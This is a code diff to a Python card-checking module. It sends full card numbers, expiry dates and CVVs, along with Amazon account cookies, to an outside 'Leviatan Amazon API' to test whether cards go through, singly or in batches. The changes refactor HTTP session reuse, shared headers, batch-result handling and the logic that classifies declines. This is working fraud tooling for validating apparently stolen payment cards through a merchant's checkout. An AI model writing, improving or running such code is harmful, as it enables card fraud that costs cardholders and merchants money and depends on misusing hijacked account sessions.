@@ -37,6 +37,11 @@ TIMEOUT_SECONDS = 60
 # How many cards to send per batch request
 BATCH_SIZE = 10
 
+HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": DEFAULT_UA,
+}
+
 
 @dataclass
 class AmazonResult:
@@ -64,10 +69,9 @@ def _classify(status_str: str, message: str) -> str:
         "do not retry",
         "cvv declined",
     ]
-    if "declined" in s:
-        return "DECLINED"
+    haystack = f"{s} {msg}"
     for marker in declined_markers:
-        if marker in msg:
+        if marker in haystack:
             return "DECLINED"
 
     # Error indicators from the docs
@@ -117,6 +121,7 @@ async def amazon_check_single(
     card: Card,
     cookies: str,
     timeout: int = TIMEOUT_SECONDS,
+    session: aiohttp.ClientSession | None = None,
 ) -> AmazonResult:
     """Check a single card against the Leviatan Amazon API.
 
@@ -129,25 +134,16 @@ async def amazon_check_single(
     """
     card_str = f"{card.number}|{card.month}|{card.year}|{card.cvv}"
     payload = {"card": card_str, "cookies": cookies}
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": DEFAULT_UA,
-    }
 
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(
-                API_URL,
-                json=payload,
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=timeout),
-            ) as resp:
-                text = await resp.text()
-                try:
-                    data = await resp.json(content_type=None)
-                except Exception:
-                    data = {"status": "⚠️ Error", "message": text[:500] or "Non-JSON response"}
-                return _parse_response(data, card_str)
+        owns_session = session is None
+        if owns_session:
+            session = aiohttp.ClientSession()
+        try:
+            return await _post_amazon(session, payload, card_str, timeout)
+        finally:
+            if owns_session:
+                await session.close()
     except asyncio.TimeoutError:
         logger.warning("Amazon API timeout for card %s", card.masked)
         return AmazonResult("ERROR", "Request timed out. Try again.", card_str)
@@ -163,6 +159,7 @@ async def amazon_check_batch(
     cards: list[Card],
     cookies: str,
     timeout: int = TIMEOUT_SECONDS,
+    session: aiohttp.ClientSession | None = None,
 ) -> list[AmazonResult]:
     """Check multiple cards in one API call (Leviatan multi-card support).
 
@@ -172,17 +169,16 @@ async def amazon_check_batch(
     """
     card_strs = [f"{c.number}|{c.month}|{c.year}|{c.cvv}" for c in cards]
     payload = {"card": card_strs, "cookies": cookies}
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": DEFAULT_UA,
-    }
 
     try:
-        async with aiohttp.ClientSession() as session:
+        owns_session = session is None
+        if owns_session:
+            session = aiohttp.ClientSession()
+        try:
             async with session.post(
                 API_URL,
                 json=payload,
-                headers=headers,
+                headers=HEADERS,
                 timeout=aiohttp.ClientTimeout(total=timeout),
             ) as resp:
                 try:
@@ -191,11 +187,16 @@ async def amazon_check_batch(
                     data = None
 
                 if data is None:
-                    # Non-JSON → fall back to sequential
-                    return await _sequential_fallback(cards, cookies, timeout)
+                    # Non-JSON → fall back to sequential (own sessions, not the batch session)
+                    return await _sequential_fallback(cards, cookies, timeout, None)
 
                 # If the API returned a list of results (one per card)
                 if isinstance(data, list):
+                    if len(data) != len(card_strs):
+                        logger.warning(
+                            "Amazon batch result count mismatch: sent=%d got=%d",
+                            len(card_strs), len(data),
+                        )
                     results = []
                     for i, item in enumerate(data):
                         if isinstance(item, dict):
@@ -214,11 +215,14 @@ async def amazon_check_batch(
                     result = _parse_response(data, card_strs[0])
                     if len(cards) == 1:
                         return [result]
-                    # Same response applied to all — fall back to sequential
-                    return await _sequential_fallback(cards, cookies, timeout)
+                    # Same response applied to all — fall back to sequential (own sessions)
+                    return await _sequential_fallback(cards, cookies, timeout, None)
 
-                # Unknown shape → sequential
-                return await _sequential_fallback(cards, cookies, timeout)
+                # Unknown shape → sequential (own sessions)
+                return await _sequential_fallback(cards, cookies, timeout, None)
+        finally:
+            if owns_session:
+                await session.close()
 
     except asyncio.TimeoutError:
         logger.warning("Amazon batch API timeout (%d cards)", len(cards))
@@ -231,11 +235,31 @@ async def amazon_check_batch(
         return [AmazonResult("ERROR", f"Unexpected error: {e}", card_strs[i]) for i in range(len(cards))]
 
 
-async def _sequential_fallback(cards: list[Card], cookies: str, timeout: int) -> list[AmazonResult]:
+async def _post_amazon(session: aiohttp.ClientSession, payload: dict,
+                       card_raw: str, timeout: int) -> AmazonResult:
+    """POST one payload and parse the response without double-consuming body."""
+    async with session.post(
+        API_URL,
+        json=payload,
+        headers=HEADERS,
+        timeout=aiohttp.ClientTimeout(total=timeout),
+    ) as resp:
+        try:
+            data = await resp.json(content_type=None)
+        except Exception:
+            text = await resp.text()
+            data = {"status": "⚠️ Error", "message": text[:500] or "Non-JSON response"}
+        if not isinstance(data, dict):
+            data = {"status": "⚠️ Error", "message": "Unexpected API response"}
+        return _parse_response(data, card_raw)
+
+
+async def _sequential_fallback(cards: list[Card], cookies: str, timeout: int,
+                               session: aiohttp.ClientSession | None = None) -> list[AmazonResult]:
     """Sequential single-card checks as a fallback for batch failure."""
     results = []
     for card in cards:
-        r = await amazon_check_single(card, cookies, timeout)
+        r = await amazon_check_single(card, cookies, timeout, session)
         results.append(r)
     return results
 
